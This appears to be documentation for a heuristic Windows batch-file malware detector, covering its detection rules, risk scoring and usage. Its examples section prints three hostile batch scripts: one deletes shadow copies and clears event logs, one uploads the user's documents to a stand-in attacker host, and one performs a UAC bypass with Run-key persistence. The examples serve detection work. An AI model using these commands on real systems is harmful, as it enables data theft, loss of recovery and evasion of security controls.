# BAT File Analyzer

## Overview

The BAT file analyzer is a purpose-built tool designed to detect potentially malicious Windows batch (.bat) files. Unlike the PE file analyzer which uses a machine learning model, the BAT analyzer employs rule-based heuristics to identify suspicious patterns, dangerous commands, and obfuscation techniques commonly found in malicious batch scripts.

## Key Features

1. **Dangerous Command Detection**: Identifies commands that are commonly used in malicious contexts
2. **Suspicious Pattern Recognition**: Detects obfuscation, encoding, and evasion techniques
3. **Obfuscation Scoring**: Quantifies the level of obfuscation used in the script
4. **Detailed Reporting**: Provides comprehensive analysis results including specific line numbers
5. **Fast Performance**: Lightweight analysis suitable for real-time scanning

## Detection Methodology

### 1. Dangerous Commands

The analyzer maintains a database of commands frequently used in malicious contexts, including:

- **System Modification Commands**: `reg`, `sc`, `netsh`, `wmic`
- **Security Bypass Commands**: Commands that disable security features
- **File Operations**: Suspicious deletion or modification commands
- **Remote Access Tools**: Commands that enable remote control
- **Information Gathering**: Commands that extract system information

Each command is checked using regular expressions to account for variations in syntax.

### 2. Suspicious Patterns

The analyzer looks for patterns that indicate potential malicious intent:

- **Base64/Hex Encoding**: Used to hide malicious payloads
- **Command Obfuscation**: Techniques like string splitting, variable substitution
- **UAC Bypass Techniques**: Registry modifications to bypass User Account Control
- **Self-deletion Mechanisms**: Code that deletes the script after execution
- **Download & Execute Patterns**: Commands that download and run external code
- **Event Log Deletion**: Attempts to clear event logs to hide traces

### 3. Obfuscation Analysis

The analyzer quantifies obfuscation using several metrics:

- **Uncommon Character Frequency**: Characters like `^`, `%`, `!` often used in obfuscation
- **Line Continuations**: Excessive use of the caret (`^`) for command splitting
- **Command Chaining**: Complex chains of commands using `&&`, `||`, or `;`
- **Variable Manipulation**: Unusual variable operations like substring extraction

### 4. Risk Scoring Algorithm

The final risk score is calculated as a weighted average of several factors:

- **Dangerous Command Score** (40%): Based on the number and severity of dangerous commands
- **Suspicious Pattern Score** (40%): Based on the number and types of suspicious patterns
- **Obfuscation Score** (20%): Based on the level of obfuscation detected

The risk score ranges from 0.0 (clean) to 1.0 (highly suspicious), with scores above 0.5 classified as "Malware".

## Real-World Examples

### Example 1: Ransomware Distribution

Batch files are often used to deploy ransomware payloads:

```batch
@echo off
powershell -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC...
vssadmin delete shadows /all /quiet
wbadmin delete catalog -quiet
wevtutil cl System
wevtutil cl Security
```

This script:
1. Uses PowerShell with encoded commands to hide the payload
2. Deletes shadow copies to prevent recovery
3. Erases event logs to hide malicious activity

### Example 2: Information Theft

Batch scripts used to steal sensitive information:

```batch
@echo off
set "u=%username%"
mkdir %temp%\data
copy "%userprofile%\Documents\*.doc*" "%temp%\data\"
copy "%userprofile%\Documents\*.pdf" "%temp%\data\"
powershell Compress-Archive %temp%\data %temp%\data.zip
certutil -encode %temp%\data.zip %temp%\data.b64
powershell -c "(New-Object System.Net.WebClient).UploadFile('https://evil.example.com/upload', '%temp%\data.b64')"
del %temp%\data.* /q /f
rmdir %temp%\data /s /q
```

This script:
1. Collects document files from user directories
2. Compresses and encodes them
3. Uploads them to a remote server
4. Covers its tracks by deleting temporary files

### Example 3: UAC Bypass & Persistence

Scripts used to bypass User Account Control and maintain persistence:

```batch
@echo off
reg add HKCU\Software\Classes\mscfile\shell\open\command /v "" /t REG_SZ /d "cmd.exe /c start malware.exe" /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v WindowsUpdate /t REG_SZ /d "%~f0" /f
eventvwr.exe
timeout /t 2 >nul
reg delete HKCU\Software\Classes\mscfile\shell\open\command /f
```

This script:
1. Creates a registry entry to exploit the eventvwr.exe UAC bypass
2. Sets up persistence through the Run registry key
3. Triggers the exploit
4. Cleans up traces

## How to Use the Analyzer

To analyze a batch file, simply call the `analyze_bat_file` function:

```python
from services.bat_analyzer import analyze_bat_file

result = analyze_bat_file("path/to/suspect.bat")
print(f"Prediction: {result['prediction']}")
print(f"Risk Score: {result['risk_score']}")
print(f"Obfuscation Score: {result['obfuscation_score']}")

# Show dangerous commands found
for cmd in result['dangerous_commands']:
    print(f"Line {cmd['line']}: {cmd['command']} - {cmd['content']}")
```

## Advantages Over Traditional Detection Methods

1. **No Signature Dependency**: Unlike antivirus solutions, doesn't rely on exact signature matches
2. **Content-Based Analysis**: Analyzes the actual behavior and content, not just file hashes
3. **Context-Aware**: Understands the context of commands, not just their presence
4. **Transparent Reasoning**: Provides clear explanation of why a file was flagged
5. **Low Resource Usage**: Doesn't require complex ML models or extensive databases

## Limitations

1. **False Positives**: Legitimate system administration scripts may use similar commands
2. **Evasion Techniques**: Sophisticated malware might use novel obfuscation techniques
3. **Contextual Understanding**: Cannot fully understand the intent behind certain commands
4. **Legitimate Obfuscation**: Some benign scripts may use obfuscation for intellectual property protection

## Future Improvements

1. **Enhanced Pattern Recognition**: Additional patterns based on emerging threats
2. **Behavior Simulation**: Simulate script execution in a safe environment
3. **Machine Learning Integration**: Supplement rule-based detection with ML classification
4. **Whitelist Integration**: Ability to whitelist known good patterns
5. **Command Deobfuscation**: Automatically deobfuscate commands for better analysis 